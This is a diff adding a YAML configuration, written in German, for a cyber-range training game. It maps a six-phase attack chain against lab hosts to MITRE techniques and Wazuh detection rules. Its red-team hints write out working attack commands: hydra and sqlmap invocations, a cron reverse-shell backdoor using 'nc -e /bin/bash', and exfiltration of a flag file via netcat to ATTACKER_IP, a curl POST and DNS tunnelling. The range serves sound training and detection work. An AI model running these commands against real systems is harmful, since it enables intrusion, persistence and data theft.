@@ -1,0 +1,199 @@
+# gm_context.yaml — Statischer Spiel-Kontext
+# Geladen von Hermes-GM-Skill, definiert Attack-Chain,
+# MITRE-Mapping, Detection-Rules und Phasen-Logik.
+version: 0.1.0
+
+game:
+  name: "Cyber-Range-Lab Pilot"
+  date: "2026-06-01"
+  duration_hours: 8
+  red_team_size: 4
+  blue_team_size: 3
+  total_servers: 13
+
+# Netzwerk-Topologie
+network:
+  headscale_url: "https://10.99.40.3:443"
+  wazuh_url: "https://10.99.20.2"
+  subnets:
+    dmz: "10.99.10.0/28"
+    blue: "10.99.20.0/28"
+    red: "10.99.30.0/28"
+    gm: "10.99.40.0/28"
+
+# Zielsysteme
+targets:
+  - name: web-target
+    ip: "10.99.10.2"
+    services: ["WordPress 5.4 (Port 8080)", "Juice Shop (Port 3000)"]
+    vulnerabilities: ["SQLi", "Slider-Revolution-RCE (CVE-2014-9734)"]
+  - name: vault-target
+    ip: "10.99.10.3"
+    services: ["Vaultwarden (Port 8443)"]
+    vulnerabilities: ["Weak Master-PW (Top-1000)", "Credential Access"]
+  - name: linux-victim
+    ip: "10.99.10.4"
+    services: ["SSH (22)", "Mailhog (8025)", "Apache (80)"]
+    vulnerabilities: ["SUID-Binary", "Cron-Misconfig", "Weak Root-PW"]
+
+# Attack-Chain (6 Phasen A-F)
+attack_phases:
+  - id: A
+    name: "Reconnaissance"
+    duration_min: 20
+    description: "nmap-Scans, gobuster, banner-grabbing auf DMZ-Targets"
+    mitre_techniques: ["T1595", "T1046"]
+    success_criteria: "Offene Ports + Services auf allen Targets identifiziert"
+    red_hints:
+      - "Starte mit nmap -sV -p- auf DMZ-Subnet (10.99.10.0/28)"
+      - "Juice Shop laeuft auf Port 3000, WordPress auf 8080"
+      - "Vaultwarden hat eine .well-known Seite — check /api/health"
+
+  - id: B
+    name: "Initial Access"
+    duration_min: 60
+    description: "3 Angriffspfade: Brute-Force, SQLi, PW-Raten"
+    mitre_techniques: ["T1110", "T1190", "T1078"]
+    success_criteria: "Zugriff auf mindestens ein Target-System"
+    paths:
+      - name: "WP-Brute-Force"
+        description: "Hydra auf wp-login.php"
+        target: web-target
+        detection_rule: "100020 (HTTP-Brute-Force)"
+      - name: "Juice-Shop-SQLi"
+        description: "SQLi via Login-Formular oder URL-Parameter"
+        target: web-target
+        detection_rule: "100030 (SQL-Injection)"
+      - name: "Vault-PW-Raten"
+        description: "Vaultwarden-Login via hydra mit rockyou-top1000"
+        target: vault-target
+        detection_rule: "100020 (HTTP-Brute-Force)"
+    red_hints:
+      - "Hydra auf wp-login: hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.99.10.2 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:Invalid'"
+      - "Juice-Shop-SQLi: sqlmap -u http://10.99.10.2:3000 --forms --batch"
+      - "Vaultwarden-API auf :8443 — check /api/identity/accounts/prelogin"
+
+  - id: C
+    name: "Privilege Escalation"
+    duration_min: 30
+    description: "SUID-find + Slider-Revolution-RCE"
+    mitre_techniques: ["T1548", "T1068"]
+    success_criteria: "Root-Zugriff auf mindestens ein Target"
+    detection_rule: "100050 (SUID-Binary), 100030 (Web-RCE)"
+    red_hints:
+      - "Find SUID-Binaries: find / -perm -4000 2>/dev/null"
+      - "Slider-Revolution-Exploit: searchsploit slider revolution"
+      - "Nach PrivEsc: /usr/local/bin/suid-helper gibt dir root"
+
+  - id: D
+    name: "Persistence"
+    duration_min: 20
+    description: "Cron-Backdoor, SSH-Key-Drop"
+    mitre_techniques: ["T1053", "T1098"]
+    success_criteria: "Permanenter Zugriff via Cron/SSH-Key"
+    detection_rule: "100060 (Cron), 100061 (SSH-Key)"
+    red_hints:
+      - "Cron-Backdoor: echo '* * * * * root nc -e /bin/bash 10.99.30.2 4444' > /etc/cron.d/backdoor"
+      - "SSH-Key-Persistence: ssh-copy-id root@10.99.10.4"
+      - "Nach Cron-Setup: warte auf naechste Ausfuehrung (max 5 min)"
+
+  - id: E
+    name: "Lateral Movement"
+    duration_min: 30
+    description: "Trophy-Secret aus Vaultwarden → SSH zu linux-victim"
+    mitre_techniques: ["T1021", "T1552"]
+    success_criteria: "Zugriff auf linux-victim (10.99.10.4)"
+    detection_rule: "100070 (Lateral-Movement)"
+    red_hints:
+      - "Vaultwarden-Master-PW cracken via hashcat -m 10 vault-hash rockyou-top1000.txt"
+      - "Im Vaultwarden-Dashboard findest du SSH-Keys als Trophy-Secret"
+      - "Lateral: ssh root@10.99.10.4 -i extracted_key"
+
+  - id: F
+    name: "Exfiltration"
+    duration_min: 20
+    description: "Trophy-File /opt/secret/flag.txt von linux-victim extrahieren"
+    mitre_techniques: ["T1048", "T1041"]
+    success_criteria: "flag.txt erfolgreich auf externes System transferiert"
+    detection_rule: "100080 (DNS-Tunneling)"
+    red_hints:
+      - "Simple Exfil: nc ATTACKER_IP 4444 < /opt/secret/flag.txt"
+      - "HTTP-POST: curl -X POST -d @/opt/secret/flag.txt https://webhook.site/..."
+      - "DNS-Tunneling: for c in $(base64 /opt/secret/flag.txt); do dig $c.exfil.example.com; done"
+
+# Detection-Rule-Mapping (Custom-Rules)
+detection_rules:
+  "100010":
+    name: "SSH-Brute-Force"
+    level: 10
+    mitre: "T1110"
+    learning_goal: "L1"
+    description: ">5 SSH-Fehlversuche in 60s"
+  "100011":
+    name: "SSH-Login nach Brute-Force"
+    level: 12
+    mitre: "T1078"
+    learning_goal: "L1"
+    description: "Erfolgreicher SSH-Login nach Brute-Force"
+  "100020":
+    name: "HTTP-Brute-Force"
+    level: 8
+    mitre: "T1110"
+    learning_goal: "L1"
+    description: ">10 HTTP 401 in 60s"
+  "100030":
+    name: "SQL-Injection"
+    level: 10
+    mitre: "T1190"
+    learning_goal: "L2"
+    description: "SQLi-Patterns in HTTP-Requests"
+  "100040":
+    name: "LFI/RFI"
+    level: 8
+    mitre: "T1190"
+    learning_goal: "L2"
+    description: "Path-Traversal-Patterns"
+  "100050":
+    name: "SUID-Privilege-Escalation"
+    level: 10
+    mitre: "T1548"
+    learning_goal: "L3"
+    description: "SUID-Binary-Execution"
+  "100060":
+    name: "Cron-Persistence"
+    level: 8
+    mitre: "T1053"
+    learning_goal: "L3"
+    description: "Crontab-Aenderung detektiert"
+  "100061":
+    name: "SSH-Key-Persistence"
+    level: 12
+    mitre: "T1098"
+    learning_goal: "L3"
+    description: "SSH-Key-Bulk-Login"
+  "100070":
+    name: "Lateral-Movement"
+    level: 10
+    mitre: "T1021"
+    learning_goal: "L4"
+    description: "SSH von neuer Quelle"
+  "100080":
+    name: "DNS-Exfiltration"
+    level: 12
+    mitre: "T1048"
+    learning_goal: "L4"
+    description: "DNS-Tunneling detektiert"
+
+# Hint-Konfiguration
+hint_policy:
+  cooldown_minutes: 5
+  max_hints_per_hour: 6
+  stillness_threshold_minutes: 30
+  escalation_threshold_minutes: 120
+  hint_depth_levels:
+    - name: "subtle"
+      description: "Richtungsweisend, keine konkreten Commands"
+    - name: "medium"
+      description: "Tool-Vorschlag + allgemeiner Befehl"
+    - name: "direct"
+      description: "Konkreter Command + Ausgabe-Erwartung"
